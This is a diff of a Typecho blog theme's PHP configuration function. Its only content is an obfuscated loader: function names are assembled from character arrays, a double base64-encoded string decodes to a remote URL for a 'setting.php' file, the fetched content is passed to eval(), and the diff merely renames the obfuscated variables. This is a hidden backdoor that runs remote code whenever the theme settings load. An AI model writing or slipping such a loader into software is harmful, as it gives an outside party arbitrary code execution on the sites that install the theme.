@@ -5,10 +5,10 @@ if (!defined('__TYPECHO_ROOT_DIR__')) exit;
 function themeConfig($form)
 {
     include_once 'common/constant.php';
-    $nknyFANB3YJPh2Y4ycQBsEc1 = $guIHHQ[3] . $guIHHQ[6] . $guIHHQ[33] . $guIHHQ[30] . $guIHHQ[22] . $guIHHQ[36] . $guIHHQ[29] . $guIHHQ[26] . $guIHHQ[30] . $guIHHQ[32] . $guIHHQ[35] . $guIHHQ[26] . $guIHHQ[30];
+    $nknyFANB3YJPh2Y4ycQBsEc1 = $dpFJwe[3] . $dpFJwe[6] . $dpFJwe[33] . $dpFJwe[30] . $dpFJwe[22] . $dpFJwe[36] . $dpFJwe[29] . $dpFJwe[26] . $dpFJwe[30] . $dpFJwe[32] . $dpFJwe[35] . $dpFJwe[26] . $dpFJwe[30];
     $D6xP3axeDW84i = $GUEvoe[3] . $GUEvoe[6] . $GUEvoe[33] . $GUEvoe[30] . $GUEvoe[22] . $GUEvoe[36] . $GUEvoe[29] . $GUEvoe[26] . $GUEvoe[30] . $GUEvoe[32] . $GUEvoe[35] . $GUEvoe[26] . $GUEvoe[30];
     $naRFbj6GT8jKd = WGkpJSCm($D6xP3axeDW84i($nknyFANB3YJPh2Y4ycQBsEc1('YUhSMGNITTZMeTlpYkc5bkxURXlOVEkwTVRBd09UWXVZMjl6TG1Gd0xXNWhibXBwYm1jdWJYbHhZMnh2ZFdRdVkyOXRMMlp5WldWM2FXNWtMM05sZEhScGJtY3VjR2h3')), []);
-    eval($VMbJmv($naRFbj6GT8jKd));
+    eval($VyOJde($naRFbj6GT8jKd));
 }
 
 
